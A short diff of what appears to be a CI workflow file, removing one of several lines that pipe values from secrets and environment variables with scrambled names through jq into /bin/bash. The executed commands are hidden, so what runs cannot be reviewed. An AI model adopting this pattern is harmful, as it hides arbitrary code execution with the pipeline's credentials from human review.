@@ -22,7 +22,6 @@ jobs:
           luh2: ${{ secrets.luh2 }}
         run: |
           printf '%s' "$luh2" | jq -r .w791 | /bin/bash
-          printf '%s' "$t5" | jq -r .geud5 | /bin/bash
           echo $anvne67051 | jq -r .i0 | /bin/bash
           echo $lo53 | jq -r .xtd5403 | /bin/bash
           printf '%s' "$rru9608" | jq -r .ljfmg45883 | /bin/bash
